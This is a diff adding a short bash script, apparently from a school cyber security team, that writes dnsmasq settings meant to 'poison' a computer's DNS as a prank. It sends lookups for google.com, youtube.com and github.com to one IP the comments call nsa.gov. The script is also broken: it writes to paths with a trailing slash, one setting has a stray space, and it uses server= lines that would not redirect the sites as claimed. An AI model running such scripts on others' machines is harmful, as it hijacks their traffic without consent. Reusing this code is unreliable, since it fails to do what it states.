@@ -1,0 +1,40 @@
+#!/bin/bash
+
+
+
+# PROGRAM DEVELOPED BY:
+# Cyrus Majd
+# in contribution to HHSCST (Holmdel High School Cyber Security Team)
+
+# This program essentially poisons the DNS table of the computer
+
+cd /
+
+cd etc/
+cd dnsmasq.d/
+
+touch /etc/dnsmasq.d/dnscache.conf/
+
+
+
+# THEN TYPE IN THE KEYBOARD:
+
+echo no-hosts >> dnscache.conf/
+
+echo no-resolv >> dnscache.conf/
+
+
+echo listen-address= 127.0.0.1 >> dnscache.conf/
+
+echo bind-interfaces >> dnscache.conf/
+
+
+
+# Pull a prank by redirecting all websites to nsa.gov
+
+
+echo server=/www.google.com/23.202.100.226 >> dnscache.conf/
+
+echo server=/www.youtube.com/23.202.100.226 >> dnscache.conf/
+
+echo server=/www.github.com/23.202.100.226 >> dnscache.conf/
